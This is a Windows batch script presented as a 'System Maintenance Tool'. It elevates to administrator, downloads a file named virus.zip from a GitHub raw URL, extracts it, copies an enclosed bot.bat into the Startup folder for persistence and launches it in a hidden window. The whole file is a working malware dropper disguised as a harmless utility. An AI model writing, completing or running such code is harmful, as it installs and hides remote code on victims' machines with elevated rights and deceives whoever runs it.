@echo off
title System Maintenance Tool
color 0A

:: Elevate to admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo Admin privileges confirmed. Starting...

powershell -Command "
    $ErrorActionPreference = 'Stop'
    $temp = [System.Environment]::GetEnvironmentVariable('TEMP')
    $zipPath = Join-Path $temp 'virus.zip'
    $extractPath = Join-Path $temp 'virus_extracted'

    # Clean slate
    if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force }
    if (Test-Path $zipPath) { Remove-Item -Path $zipPath -Force }

    # Download
    Write-Host 'Downloading from GitHub...'
    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/main/virus.zip' -OutFile $zipPath
    } catch {
        Write-Host 'Download failed:' $_.Exception.Message
        exit 1
    }

    # Verify download
    if (-not (Test-Path $zipPath) -or (Get-Item $zipPath).Length -eq 0) {
        Write-Host 'Downloaded file is empty or missing.'
        exit 1
    }
    Write-Host 'Download successful. Size:' (Get-Item $zipPath).Length 'bytes'

    # Create extraction folder
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null

    # Extract using two methods (fallback)
    Write-Host 'Extracting...'
    try {
        # Method 1: .NET ZipFile (overwrite)
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath, $true)
    } catch {
        Write-Host '.NET extraction failed, trying Expand-Archive...'
        # Method 2: Expand-Archive with -Force
        try {
            Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
        } catch {
            Write-Host 'All extraction methods failed.'
            exit 1
        }
    }

    # Locate bot.bat
    $bot = Get-ChildItem -Path $extractPath -Recurse -Filter 'bot.bat' -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($bot) {
        Write-Host 'Found bot.bat at:' $bot.FullName
        $startup = [Environment]::GetFolderPath('Startup')
        $dest = Join-Path $startup 'bot.bat'
        Copy-Item -Path $bot.FullName -Destination $dest -Force
        Write-Host 'Copied to Startup.'
        Start-Process -FilePath $bot.FullName -WindowStyle Hidden
        Write-Host 'bot.bat is now running.'
    } else {
        Write-Host 'bot.bat NOT found in extracted files. Listing extracted contents:'
        Get-ChildItem -Path $extractPath -Recurse | ForEach-Object { Write-Host $_.FullName }
        exit 1
    }
"

if %errorlevel% equ 0 (
    echo All done.
) else (
    echo Something went wrong. Check the output above.
)
pause
exit /b
